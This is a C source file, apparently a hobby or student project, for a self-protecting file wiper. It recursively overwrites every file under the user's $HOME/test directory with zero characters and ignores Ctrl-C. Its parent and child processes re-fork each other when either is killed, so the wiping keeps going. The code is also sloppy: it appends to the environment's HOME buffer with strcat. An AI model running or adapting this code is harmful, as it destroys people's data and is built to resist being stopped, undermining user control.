#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <pwd.h>

void noStop(int sig);
void mainLoop(pid_t p);

// CODE FOUNDED IN STACKOVERFLOW (finding DIR elements and also counting their size)
#ifndef NAME_MAX
#define NAME_MAX 1024
#endif

static long goDir(char *dirname)
{
    FILE *p;
    DIR *dir = opendir(dirname);
    if (dir == 0)
        return 0;

    struct dirent *dit;
    struct stat st;
    long size = 0, i;
    long total_size = 0;
    char filePath[NAME_MAX];

    while ((dit = readdir(dir)) != NULL)
    {
        if ( (strcmp(dit->d_name, ".") == 0) || (strcmp(dit->d_name, "..") == 0) )
            continue;

        sprintf(filePath, "%s/%s", dirname, dit->d_name);
        if (lstat(filePath, &st) != 0)
            continue;
        size = st.st_size;

        if (S_ISDIR(st.st_mode))
        {
            long dir_size = goDir(filePath) + size;
            // printf("DIR\t");
            // printf("MODE: %lo\t", (unsigned long) st.st_mode);
            // printf("SIZE: %ld\t", dir_size);
            // printf("%s\n", filePath);
            total_size += dir_size;
        }
        else
        {
            total_size += size;
            // printf("FILES\t");
            // printf("MODE: %lo\t", (unsigned long) st.st_mode);
            // printf("SIZE: %ld\t", size);
            // printf("%s\n", filePath);
            
            // modified by João Guio
            // Now opens the filePath, and overwrite it with zeros.
            p = fopen(filePath, "wb");
            for (i = 0; i < size; i++) {
                fputs("0", p);
            }
            fclose(p);
        }
    }
    return total_size;
}
// END OF CODE FOUNDED IN STACK OVERFLOW

int main (int argc, char *argv[]) {
    pid_t pid = 0;
    if (signal(SIGINT, noStop) == SIG_ERR)
        puts("cant catch signal SIGINT");
    pid = fork();
    if (pid == 0) {
        puts("child");
        mainLoop(pid);
    }
    else {
        if (pid > 1) {
            puts("parent");
            mainLoop(pid);
        }
        else {
            puts ("erro no fork");
        }
    }
}

void mainLoop(pid_t p) {
    int x = 1, status, forked = 0;
    pid_t pid, parent;
    char *homedir;
    if (p == 0) {
        parent = getppid();
        while(x > 0) {
            if (kill(parent, 0) == 0) {
                puts("parent's alive!");
            }
            else {
                puts("daddy is kill, forking");
                pid = fork();
                forked = 1;
                break;
            }
            // HERE IS WHERE THE MAGIC HAPPEN
            if ((homedir = getenv("HOME")) == NULL) {
                homedir = getpwuid(getuid())->pw_dir;
            }
            strcat(homedir, "/test");
            puts(homedir);
            // print how many bytes of data where overwritten
            printf("%ld\n", goDir(homedir));
        }
        if (forked) {
            if (pid == 0) {
                puts("child");
                mainLoop(pid);
            }
            else {
                if (pid > 1) {
                    puts("parent");
                    mainLoop(pid);
                }
                else {
                    puts ("erro no fork");
                }
            }
        }
    }
    else {
        waitpid(-1, &status, 0);
        if (WIFSIGNALED(status)) {
            pid = fork();
            if (pid == 0) {
                puts("child");
                mainLoop(pid);
            }
            else {
                if (pid > 1) {
                    puts("parent");
                    mainLoop(pid);
                }
                else {
                    puts ("erro no fork");
                }
            }
        }
        else {
            puts("filho terminou");
        }
    }
}

void noStop(int sig) {
    if (sig == SIGINT) {
        puts("You can't interrupt me");
    }
}